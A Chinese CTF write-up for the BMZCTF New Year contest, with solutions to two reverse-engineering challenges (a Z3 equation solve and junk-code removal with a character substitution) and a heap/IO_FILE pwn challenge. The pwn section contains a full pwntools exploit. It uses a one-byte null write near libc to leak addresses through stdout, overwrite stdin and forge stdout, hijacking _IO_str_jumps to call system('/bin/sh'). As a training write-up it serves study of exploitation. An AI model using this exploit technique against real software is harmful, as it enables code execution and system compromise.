# 前言

白帽子网络安全公开赛在元旦举行了，pwn题目竟然没人做出来，赛后结合官方给出的exp进行了复现，和详细的记录。

# RE -> checkin (单向算法，Z3,调试)

## 题目分析

题目是个简单的单向算法，如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[2]; // [esp+1Ah] [ebp-16Eh] BYREF
  _BYTE v5[34]; // [esp+1Ch] [ebp-16Ch] BYREF
  int v6; // [esp+3Eh] [ebp-14Ah]
  char Str[50]; // [esp+42h] [ebp-146h] BYREF
  int v8[26]; // [esp+74h] [ebp-114h] BYREF
  _DWORD v9[40]; // [esp+DCh] [ebp-ACh] BYREF
  int i; // [esp+17Ch] [ebp-Ch]

  __main();
  puts("Please input:");
  scanf("%s", Str);
  if ( strlen(Str) != '!'
    || Str[0] != 'f'
    || Str[1] != 'l'
    || Str[2] != 'a'
    || Str[3] != 'g'
    || Str[4] != '{'
    || Str[32] != '}' )
  {
    printf("you are wrong!!!");
    exit(0);
  }
  memset(v9, 0, sizeof(v9));
  v9[0] = 12864;
  v9[1] = 5522;
  v9[2] = 10710;
  v9[3] = 6924;
  v9[4] = 788;
  v9[5] = 10715;
  v9[6] = 10008;
  v9[7] = 13022;
  v9[8] = 15893;
  v9[9] = 9754;
  v9[10] = 7946;
  v9[11] = 7490;
  v9[12] = 5636;
  v9[13] = 13477;
  v9[14] = 2198;
  v9[15] = 5861;
  v9[16] = 5799;
  v9[17] = 5259;
  v9[18] = 6464;
  v9[19] = 6171;
  v9[20] = 2269;
  v9[21] = 9251;
  v9[22] = 8315;
  v9[23] = 0xBAD;
  v9[24] = 0xFFFFFF39;
  v9[25] = 2680;
  LPL(Str, v8);
  for ( i = 0; i <= 25; ++i )
  {
    if ( v8[i] != v9[i] )
    {
      printf("try again!!!");
      exit(0);
    }
  }
  putchar(10);
  v6 = 0;
  memset(v5, 0, 4 * (((v4 - v5 + 40) & 0xFFFFFFFC) >> 2));
  v4[0] = 12;
  v4[1] = -93;
  v5[0] = -91;
  v5[1] = 120;
  v5[2] = 113;
  v5[3] = -75;
  v5[4] = 71;
  v5[5] = -86;
  v5[6] = 37;
  v5[7] = 69;
  v5[8] = 126;
  v5[9] = 42;
  v5[10] = 97;
  v5[11] = -6;
  v5[12] = -27;
  v5[13] = -44;
  v5[14] = -53;
  v5[15] = -18;
  v5[16] = 46;
  v5[17] = 120;
  v5[18] = -72;
  v5[19] = 124;
  v5[20] = 52;
  v5[21] = -53;
  v5[22] = 102;
  v5[23] = 29;
  v5[24] = 56;
  v5[25] = -26;
  v5[26] = -65;
  v5[27] = 98;
  v5[28] = 119;
  v5[29] = -81;
  v5[30] = 41;
  v5[31] = -18;
  v5[32] = 123;
  v5[33] = 59;
  LCK(v8, v4);
  putchar(10);
  system("PAUSE");
  return 0;
}
```
重点函数逻辑在LPL函数：
```c
int __cdecl LPL(char *a1, int *a2)
{
  int result; // eax
  int v3[3]; // [esp+18h] [ebp-4D0h]
  int v4; // [esp+24h] [ebp-4C4h]
  int v5; // [esp+28h] [ebp-4C0h]
  int v6; // [esp+2Ch] [ebp-4BCh]
  int v7; // [esp+30h] [ebp-4B8h]
  int v8; // [esp+34h] [ebp-4B4h]
  int v9; // [esp+38h] [ebp-4B0h]
  int v10; // [esp+3Ch] [ebp-4ACh]
  int v11; // [esp+40h] [ebp-4A8h]
  int v12; // [esp+44h] [ebp-4A4h]
  int v13; // [esp+68h] [ebp-480h]
  int v14; // [esp+7Ch] [ebp-46Ch]
  int v15; // [esp+80h] [ebp-468h]
  int v16; // [esp+90h] [ebp-458h]
  int v17; // [esp+E0h] [ebp-408h]
  int v18; // [esp+F4h] [ebp-3F4h]
  int v19; // [esp+108h] [ebp-3E0h]
  int v20; // [esp+120h] [ebp-3C8h]
  int v21; // [esp+14Ch] [ebp-39Ch]
  int v22; // [esp+150h] [ebp-398h]
  int v23; // [esp+158h] [ebp-390h]
  int v24; // [esp+1A8h] [ebp-340h]
  int v25; // [esp+1F8h] [ebp-2F0h]
  int v26; // [esp+270h] [ebp-278h]
  int v27; // [esp+338h] [ebp-1B0h]
  int v28; // [esp+360h] [ebp-188h]
  char v29[12]; // [esp+4C8h] [ebp-20h] BYREF
  int v30; // [esp+4D4h] [ebp-14h]
  int v31; // [esp+4D8h] [ebp-10h]
  int i; // [esp+4DCh] [ebp-Ch]

  strcpy(v29, "T1-Faker");
  v30 = 0;
  v31 = 0;
  putchar(10);
  for ( i = 0; i != 256; ++i )
    v3[i] = i;
  *a2 = v3[0] + 75 * a1[10] + 12 * a1[5] + 44 * a1[7] + 17 * a1[6] + 100 * a1[8] + 20 * a1[9];
  a2[1] = 58 * a1[9] + 63 * a1[10] + 46 * a1[5] + 25 * a1[8] - 89 * a1[7] + 12 * a1[6] + 2 * v3[1];
  a2[2] = 41 * a1[7] + 11 * a1[10] + 26 * a1[5] + 45 * a1[9] + 23 * a1[8] + 77 * a1[6] + 3 * v3[2];
  a2[3] = 44 * a1[5] + 19 * a1[9] + 15 * a1[10] + 12 * a1[8] + 34 * a1[7] + 20 * a1[6] + 4 * v4;
  a2[4] = 8 * a1[6] + 5 * a1[7] + 2 * (2 * a1[9] + a1[10]) - 4 * a1[8] + a1[5] + 5 * v5;
  a2[5] = v6 + 85 * a1[5] + 99 * a1[10] + 8 * a1[8] + 10 * a1[7] + 12 * a1[6] + 9 * a1[9] + v7;
  a2[6] = v9 + v8 + 55 * a1[14] + 12 * a1[12] + 11 * a1[11] + 33 * a1[13] + 77 * a1[15] + 20 * a1[16] + v10;
  a2[7] = 3 * a1[16] + 56 * a1[12] + 21 * a1[14] + 45 * a1[13] + 66 * a1[11] + 78 * a1[15] + v11 * v12;
  a2[8] = 13 * a1[13] + 96 * a1[11] + 78 * a1[16] + 65 * a1[12] + 25 * a1[15] + 54 * a1[14] + v14 / v6;
  a2[9] = 41 * a1[12] + 11 * a1[11] + 36 * a1[16] + 7 * a1[15] + 20 * a1[14] + 88 * a1[13] + v16 / v4;
  a2[10] = v27 + a1[13] + 8 * a1[12] + 55 * a1[15] + 14 * a1[14] + 62 * a1[16] + 17 * a1[11] + v28;
  a2[11] = 5 * a1[14] + a1[11] + a1[16] + 52 * a1[15] + 2 * a1[12] + 6 * a1[13] + 88 * a1[14] + v26 / 3;
  a2[12] = 9 * a1[20] + a1[18] + a1[17] + 8 * a1[19] + 11 * a1[21] + 85 * a1[22] + v21 / v8;
  a2[13] = 55 * a1[22] + 22 * a1[21] + 78 * a1[20] + 56 * a1[18] + 65 * a1[19] + a1[17] + v22 / 3;
  a2[14] = v18 + 6 * a1[17] + 19 * a1[19] + 3 * a1[20] - a1[21] - a1[22] + a1[18] * v13 - v20;
  a2[15] = 4 * a1[17] + 46 * a1[22] + 77 * a1[21] + 8 * a1[20] - 10 * a1[18] - 5 * a1[19] - v16;
  a2[16] = 19 * a1[19] + 18 * a1[18] + 17 * a1[17] + 21 * a1[21] + 22 * a1[22] + 20 * a1[20] + v25;
  a2[17] = 8 * a1[18] + 5 * a1[20] + 9 * a1[22] + 85 * a1[21] + 9 * a1[19] + 4 * a1[17] - v13 * v16;
  a2[18] = 88 * a1[27] + 8 * a1[26] + 6 * a1[24] + 5 * a1[23] + 7 * a1[25] + 22 * a1[28] - v17 * v5;
  a2[19] = 7 * a1[27] + 10 * a1[26] + 80 * a1[25] + 50 * a1[24] + 12 * a1[28] - 20 * a1[23] - 8 * v23;
  a2[20] = 3 * a1[23] + 25 * a1[28] + 8 * a1[26] + 14 * a1[25] + 4 * a1[27] + 7 * a1[24] - 12 * v19;
  a2[21] = 6 * a1[23] + 8 * (10 * a1[27] + a1[26] + 5 * a1[28]) + 5 * a1[24] + 60 * a1[25] - 5 * v24;
  a2[22] = -26 * a1[26] + 41 * a1[24] + 40 * a1[23] + 10 * a1[27] + 85 * a1[28] + 25 * a1[25] - 10 * v15;
  a2[23] = -10 * a1[25] + 55 * a1[24] + 9 * (a1[23] + a1[28]) - a1[26] - a1[27];
  a2[24] = a1[20] + a1[30] + a1[29] - a1[19] - 2 * a1[18] + a1[16] - 5 * v17;
  result = a1[25] + 55 * a1[27] + 4 * a1[5] + a1[30] - a1[29] + 3 * a1[16] - 20 * v13;
  a2[25] = result;
  return result;
}

```

经过这个函数之后得到的结果和固定数组比较相等即可获得flag，这里发现都是一些方程组，可以用z3方便的约束求解。
LCK函数处理输出flag：

```c
int __cdecl LCK(int *a1, char *a2)
{
  int j; // [esp+18h] [ebp-10h]
  int i; // [esp+1Ch] [ebp-Ch]

  puts("The final flag is:");
  printf("flag{");
  for ( i = 0; i <= 35; ++i )
    a2[i] ^= LOBYTE(a1[i % 26]);
  a2[23] = 102;
  for ( j = 0; j <= 35; ++j )
    putchar(a2[j]);
  return putchar(125);
}
```

## 思路

官方思路：z3模拟LPL算法约束求解
非预期：

1. 得到输入之后并不是flag，而是通过这个输入是程序走向输出flag的分支，执行LCK函数，但是这里程序输出flag的数据都是已知的，可以直接调用LCK函数直接得到flag
2. 动调内存也可以直接看到flag。

## exp

官方exp：

```python
from z3 import *
P=[12864,5522,10710,6924,788,10715,10008,13022,15893,9754,7946,7490,5636,13477,
   2198,5861,5799,5259,6464,6171,2269,9251,8315,2989,-199,2680]
a = [z3.BitVec("p%d" % i, 8)for i in range(33)]
f="flag{"
s=Solver()
s.add(a[0]==ord(f[0]))
s.add(a[1]==ord(f[1]))
s.add(a[2]==ord(f[2]))
s.add(a[3]==ord(f[3]))
s.add(a[4]==ord(f[4]))
s.add(P[0]==12*a[5]+44*a[7]+17*a[6]+100*a[8]+20*a[9]+75*a[10])
s.add(P[1]==63*a[10]+58*a[9]+46*a[5]+25*a[8]-89*a[7]+12*a[6]+2)
s.add(P[2]==23*a[8]+45*a[9]+26*a[5]+77*a[6]+11*a[10]+41*a[7]+6)
s.add(P[3]==34*a[7]+12*a[8]+15*a[10]+19*a[9]+20*a[6]+44*a[5]+12)
s.add(P[4]==4*a[9]+2*a[10]+5*a[7]-4*a[8]+8*a[6]+a[5]+20)
s.add(P[5]==12*a[6]+10*a[7]+9*a[9]+8*a[8]+99*a[10]+85*a[5]+11)
s.add(P[6]==11*a[11]+12*a[12]+33*a[13]+55*a[14]+77*a[15]+20*a[16]+24)
s.add(P[7]==66*a[11]+45*a[13]+78*a[15]+21*a[14]+56*a[12]+3*a[16]+110)
s.add(P[8]==65*a[12]+25*a[15]+78*a[16]+54*a[14]+96*a[11]+a[13]*13+5)
s.add(P[9]==88*a[13]+20*a[14]+a[15]*7+a[16]*36+a[11]*11+a[12]*41+10)
s.add(P[10]==a[14]*14+a[15]*55+a[16]*62+a[11]*17+a[12]*8+a[13]+410)
s.add(P[11]==a[15]*52+a[16]+a[11]+a[12]*2+a[14]*5+a[13]*6+a[14]*88+50)
s.add(P[12]==a[17]+a[18]+8*a[19]+9*a[20]+11*a[21]+85*a[22]+11)
s.add(P[13]==a[18]*56+a[19]*65+a[20]*78+a[21]*22+a[22]*55+a[17]+26)
s.add(P[14]==a[19]*19+a[20]*3-a[21]-a[22]+a[17]*6+a[18]*20-11)
s.add(P[15]==a[20]*8+a[21]*77+a[22]*46+a[17]*4-a[18]*10-a[19]*5-30)
s.add(P[16]==a[21]*21+a[22]*22+a[17]*17+a[18]*18+a[19]*19+a[20]*20+120)
s.add(P[17]==a[22]*9+a[21]*85+a[20]*5+a[19]*9+a[18]*8+a[17]*4-600)
s.add(P[18]==a[23]*5+a[24]*6+a[25]*7+a[26]*8+a[27]*88+a[28]*22-200)
s.add(P[19]==a[24]*50+a[25]*80+a[26]*10+a[27]*7+a[28]*12-a[23]*20-640)
s.add(P[20]==a[25]*14+a[26]*8+a[27]*4+a[28]*25+a[23]*3+a[24]*7-720)
s.add(P[21]==a[26]*8+a[27]*80+a[28]*40+a[23]*6+a[24]*5+a[25]*60-500)
s.add(P[22]==a[27]*10+a[28]*85+a[23]*40+a[24]*41+a[25]*25-a[26]*26-260)
s.add(P[23]==a[28]*9+a[23]*9+a[24]*55-a[25]*10-a[26]-a[27])
s.add(P[24]==a[29]+a[30]+a[20]-a[19]-a[18]*2+a[16]-250)
s.add(P[25]==a[30]-a[29]+3*a[16]+4*a[5]+55*a[27]+a[25]-400)

print(s.check())
answer=s.model()
print(answer)
for i in range(len(answer)):
	#print (input[i])
	flag.append(answer[a[i]].as_long())
print(bytes(flag).decode()+'}')
# flag{00000000000000011111111111}
# 输入得 flag{L1sten_t0_the_s1lence_Of_extinct10n!}
```

官方exp要在z3版本4.8.10.0上跑，最新z3版本跑不出来。
非预期：

```python

# -------------------华丽的分割线------------------mysolve
t = [
   12,-93,-91,120,113,-75,71,-86,37,69,126,42,97,-6,-27,-44,-53,
   -18,46,120,-72,124,52,-53,102,29,56,-26,-65,98,119,-81,41,-18,
   123,59
]
lp=[12864,5522,10710,6924,788,10715,10008,13022,15893,9754,7946,7490,5636,13477,
   2198,5861,5799,5259,6464,6171,2269,9251,8315,2989,-199,2680]
for i in range(len(t)):
   t[i] = (t[i] ^ lp[i%26]&0xff)&0xff
t[23] = 102
print(len(t),len(lp))
for i in range(len(t)):
   print(chr(t[i]),end='')

# L1sten_t0_the_s1lence_Of_extinct10n!%
```

## 总结

z3的运用。

# RE -> bmzre (花指令、古典密码替换)

## 题目分析

```asm
.text:0040DB9C F3 AB                                   rep stosd
.text:0040DB9E 68 0C 30 42 00                          push    offset Format   ; "input your flag:\n"
.text:0040DBA3 E8 D8 34 FF FF                          call    _printf
.text:0040DBA8 83 C4 04                                add     esp, 4
.text:0040DBAB 6A 20                                   push    20h ; ' '       ; MaxCharCount
.text:0040DBAD 8D 45 DC                                lea     eax, [ebp+DstBuf]
.text:0040DBB0 50                                      push    eax             ; DstBuf
.text:0040DBB1 6A 00                                   push    0               ; FileHandle
.text:0040DBB3 E8 68 FB FF FF                          call    __read
.text:0040DBB8 83 C4 0C                                add     esp, 0Ch
.text:0040DBBB C6 45 FC 00                             mov     [ebp+var_4], 0
.text:0040DBBF E8 02 00 00 00                          call    sub_40DBC6
.text:0040DBC4 6A 12                                   push    12h
.text:0040DBC4                         _main_0         endp ; sp-analysis failed
.text:0040DBC4
.text:0040DBC6
.text:0040DBC6                         ; =============== S U B R O U T I N E =======================================
.text:0040DBC6
.text:0040DBC6
.text:0040DBC6                         sub_40DBC6      proc near               ; CODE XREF: _main_0+3F↑p
.text:0040DBC6 83 C4 04                                add     esp, 4
.text:0040DBC9 6A 10                                   push    10h             ; Count
.text:0040DBCB 8D 4D DC                                lea     ecx, [ebp-24h]
```
这里是因为ida对call函数的分析出了错误，这里的花指令将call函数当jmp使用，没有retn，只有一个add esp 4来维持堆栈平衡，直接上脚本去花。

```python
import idautils
import idc

def my_nop(addr, endaddr):
    while addr < endaddr:
        patch_byte(addr, 0x90)
        addr += 1

pattern = "E8 02 00 00 00 6A 12 83 C4 04"
cur_addr = 0x00401000
end_addr = 0x00411E40

while cur_addr<end_addr:
    cur_addr = idc.find_binary(cur_addr,SEARCH_DOWN,pattern)
    print("patch address: " + hex(cur_addr)) # 打印提示信息
    if cur_addr == idc.BADADDR:
        break
    else:
        my_nop(cur_addr,cur_addr+10)
    cur_addr = idc.next_head(cur_addr)
```

去除后如下：

```c
int __cdecl main_0(int argc, const char **argv, const char **envp)
{
  char v4[20]; // [esp+50h] [ebp-4Ch] BYREF
  char Destination[20]; // [esp+64h] [ebp-38h] BYREF
  char DstBuf[16]; // [esp+78h] [ebp-24h] BYREF
  char Source[20]; // [esp+88h] [ebp-14h] BYREF

  printf("input your flag:\n");
  _read(0, DstBuf, 0x20u);
  Source[16] = 0;
  strncpy(Destination, DstBuf, 0x10u);
  Destination[16] = 0;
  strncpy(v4, Source, 0x10u);
  v4[16] = 0;
  sub_40100A();
  sub_40100F();
  printf("your flag is  bmzctf{%s}\n", DstBuf);
  return 0;
}
```

第一个检查函数,考察负数的表示方法和使用
对输入的字符进行-109操作，这里考察了char类型
一个字节的范围是 0x00-0xff
char类型强制类型转化的话可以看作有符号整数
这里所比较的字符串为负数 所以写脚本的时候需要+0x100或者&0xff

```c
int __cdecl sub_40DE60(char *Str1)
{
  int i; // [esp+4Ch] [ebp-4h]

  for ( i = 0; i < 16; ++i )
    Str1[i] -= 109;
  if ( strcmp(Str1, &Str2) )
  {
    printf("no flag!!!\n");
    exit(0);
  }
  printf("first_function is ok \n");
  return 0;
}
```

第二段是一个顺序变换：

```c
int __cdecl sub_40DC60(int a1)
{
  int i; // [esp+50h] [ebp-30h]
  char Str1[20]; // [esp+54h] [ebp-2Ch] BYREF
  char Str2[20]; // [esp+68h] [ebp-18h] BYREF
  int v5; // [esp+7Ch] [ebp-4h]

  v5 = 2103;
  strcpy(Str2, "81a41a650bd2e906");
  for ( i = 0; i < 4; ++i )
  {
    Str1[4 * i] = *(_BYTE *)(a1 + v5 / 1000 + 4 * i); //千位
    Str1[4 * i + 1] = *(_BYTE *)(a1 + v5 % 1000 / 100 + 4 * i);//百位
    Str1[4 * i + 2] = *(_BYTE *)(a1 + v5 % 100 / 10 + 4 * i);//十位
    Str1[4 * i + 3] = *(_BYTE *)(a1 + v5 % 10 + 4 * i);//个位
  }
  Str1[16] = 0;
  if ( strcmp(Str1, Str2) )
  {
    printf("no flag!!!\n");
    exit(0);
  }
  printf("scond_function is ok \n");
  return 0;
}
```

## exp

```python
flag=''
m=[0xc8,0xf4,0xf5,0xc7,0xc5,0xc3,0xf9,0xc6,0xf7,0xcb,0xc8,0xc7,0xca,0xf8,0xc3,0xc4]
for i in m:
            flag+=chr(i+109-0x100)
            # flag+=chr((i+109)&0xff)
print (flag)
str2 = '81a41a650bd2e906'

for i in range(0,len(str2),4):
    flag += str2[2+i]
    flag += str2[1+i]
    flag += str2[0+i]
    flag += str2[3+i]
print ('bmzctf{'+flag+'}')
```

## 总结

花指令去除，花指令用call代替jmp导致ida分析失败。

# PWN -> goodfile (IOFile、一字节\x00任意写、stdout泄露、stdin任意写)

## 题目分析

保护全开，题目只给了附件，没有libc，ida分析程序知道,程序之后四次申请机会，babyheap函数如下：

```c
int babyheap()
{
  int v0; // eax
  unsigned int v1; // eax
  _BYTE *v2; // rax
  int v4; // [rsp+8h] [rbp-8h]
  int v5; // [rsp+Ch] [rbp-4h]

  v0 = menu();
  if ( v0 == 1 )
  {
    v4 = readint("alloc size: ");
    if ( v4 <= 0 || (v5 = readint("read size: "), v5 <= 0) )
    {
      LODWORD(v2) = puts(aInvalidSize);
    }
    else
    {
      ptr = (__int64)calloc(1uLL, v4);
      if ( !ptr )
      {
        puts(aMemoryError);
        exit(1);
      }
      v1 = v4;
      if ( v5 <= v4 )
        v1 = v5;
      readline("data: ", ptr, v1);
      v2 = (_BYTE *)(v5 - 1LL + ptr); 
      *v2 = 0;                           //任意写一字节\x00
    }
  }
  else if ( v0 < 1 || v0 > 4 )
  {
    LODWORD(v2) = puts(aInvalidChoice);
  }
  else
  {
    LODWORD(v2) = puts(aNotImplemented);
  }
  return (int)v2;
}
```

calloc申请内存，size不能为负数，程序实际上只有申请功能，任意一字节\x00溢出可以考虑iofile，stdout泄露libc，stdin任意写。

## 漏洞点

在readline("data: ", ptr, v1)的时候用的size是chunksize和readsize的小者，但是在给read data末尾赋值\x00的时候用的是readsize，因此当readsize>allocsize时存在ptr+readsize-1处写\x00漏洞。

## 利用

当calloc申请的堆块大小很大时（0x200000），申请出来的堆块会紧挨着libc（从高地址到地址值延申），因此我们可以利用这个任意写\x00的漏洞往libc的内存中写入一个\x00字节，程序没有提供edit、show等功能，所以最合适不过的就是iofile泄露，stdin进行任意地址写，劫持stdout的vtable来劫持执行流。这里用_IO_str_overflow的利用方式。
思路：
stdout泄露libc，修改stdin的_IO_buf_base末尾为\x00,会使得_IO_buf_base指向stdin结构体起始地址，即可利用输入缓冲区覆盖stdin的_IO_read_ptr=stdout+0xd8、_IO_read_end=stdout、_IO_buf_base=stdout、_IO_buf_end=stdout+0x2000，使得可以实现覆盖stdout结构体，因为IO_getc函数的作用是刷新_IO_read_ptr，每次会从输入缓冲区读一个字节数据即将_IO_read_ptr加一，当_IO_read_ptr等于_IO_read_end的时候便会调用read读数据到_IO_buf_base地址中,实现覆盖stdout。之后可以按照_IO_str_jumps -> overflow的方法构造覆盖的内容，去劫持控制流。

**步骤：**
stdout泄露libc：

1. 申请大chunk临近libc，利用漏洞将stdout的_IO_read_end末尾置0
2. 再申请大chunk临近libc，利用漏洞将stdout的_IO_write_base末尾置0，即满足_IO_read_end = _IO_write_base
3. 当调用puts会泄露libc

覆盖stdin结构体：

1. 申请大chunk，将stdin的_IO_buf_base的末尾置0,此时_IO_buf_base指向stdin
2. 当调用fgets时会覆盖stdin，大小为_IO_buf_end-_IO_buf_base，_IO_read_ptr=stdout+0xd8、_IO_read_end=stdout、_IO_buf_base=stdout、_IO_buf_end=stdout+0x2000
3. 再次fgets时由于_IO_read_ptr>_IO_read_end而触发__underflow调用_IO_SYSREAD函数最终执行系统调用读取数据到_IO_buf_base（已被覆盖成stdout），读取大小为_IO_buf_end-_IO_buf_base
4. 此时stdout已被覆盖。

覆盖stdout结构体劫持执行流：

1. _IO_write_ptr = _IO_buf_end = p64((new_size - 100) // 2) 
2. flags = p64(0xfbad1800)
3. fp+0xe0 = system
4. 其他可以按照原数据填充

## exp

```python
#coding:utf-8
from pwn import *
context(arch='amd64',log_level='debug')
context.terminal = ["/bin/tmux", "sp",'-h']
def new(size, offset, data, quiet=False):
    if quiet:
        p.sendline("1")
        p.sendline(str(size))
        p.sendline(str(offset))
        p.sendline(data)
    else:
        p.sendlineafter("> ", "1")
        p.sendlineafter(": ", str(size))
        p.sendlineafter(": ", str(offset))
        p.sendlineafter(": ", data)


libc = ELF("/home/xxx/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6")
p=process("./goodfile")
# elf=ELF('./goodfile')
# print (elf.libc)
# libc=elf.libc
# make chunk adjacent to libc
base = 0x200000
space = (base + 0x1000) * 1 - 0x10
# make _IO_read_end = _IO_write_base
new(base, space + libc.sym['_IO_2_1_stdout_'] + 0x10 + 1, 'A')
space = (base + 0x1000) * 2 - 0x10
new(base, space + libc.sym['_IO_2_1_stdout_'] + 0x20 + 1, 'B', quiet=True)
libc_base = u64(p.recvline()[0x08:0x10]) - 0x3ed8b0
success("libc = " + hex(libc_base))

# get the shell!
space = (base + 0x1000) * 3 - 0x10
new(base, space + libc.sym['_IO_2_1_stdin_'] + 0x38 + 1, 'C')
gdb.attach(p)

# stdin
payload = p64(0xfbad208b)
# make stdin's read_ptr >= read_end to trigger __underflow(fp)
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x84)
# make _IO_buf_base point to stdout,copy the buffer to user memory
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_']) * 6
# make IO_buf_end = stdout + 0x100
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x100)
payload += b'\0' * (8*7 + 4) # padding

new_size = libc_base + libc.search('/bin/sh\x00').next()
# stdout
payload += p64(0xfbad1800)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64((new_size - 100) // 2) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64((new_size - 100) // 2) # _IO_buf_end
payload += p64(0) * 4
payload += p64(libc_base + libc.sym["_IO_2_1_stdin_"])
payload += p64(1) + p64((1<<64) - 1)
payload += p64(0) + p64(libc_base + 0x3ed8c0)
payload += p64((1<<64) - 1) + p64(0)
payload += p64(libc_base + 0x3eb8c0)
payload += p64(0) * 6
payload += p64(libc_base + 0x3e8360) # _IO_str_jumps
payload += p64(libc_base + libc.sym["system"]) # _allocate_buffer
payload += p64(libc_base + libc.sym["_IO_2_1_stdout_"]) # _free_buffer
payload += p64(libc_base + libc.sym["_IO_2_1_stdin_"])
p.sendlineafter("> ", payload)
pause()

p.interactive()
```

tips：
1. stdin的read_ptr >= read_end时说明缓冲区字符不足，需要执行系统调用read向缓冲区读入数据，重置read_ptr = buf_base,read_end += count,返回后再将缓冲区数据memcpy到用户内存。
2. payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x84)，只要满足read_ptr >= read_end就行，0x84是分界点，应为覆盖stdin的时候已经读入了0x84数据，所以必须要大于0x84

## 总结

这个题目出的知识点算是经典的iofile题目，利用方式也是经典手法，之前没接触过这类IO_file，复盘之后发现堆IOFile有了更深的影响，学习IOFile我觉得得结合相关的libc去辅助理解学习会更快一点，有利于理解利用方式的手法。

## 参考

1. [iofile之任意文件读写](https://xz.aliyun.com/t/5853?page=1#toc-0)
2. [IO FILE之fread详解](https://ray-cp.github.io/archivers/IO_FILE_fread_analysis)

## 出题思路

1. IOFile、alloc大chunk(0x200000)申请出来的地址紧邻libc
2. 结合任意地址写\x00可以实现修改libc地址的末尾为0，结合IOFile泄露，劫持执行流
3. 环境2.27

# 附件

[附件](https://github.com/1094093288/IMG/tree/master/Pwn/2021BMZCTF)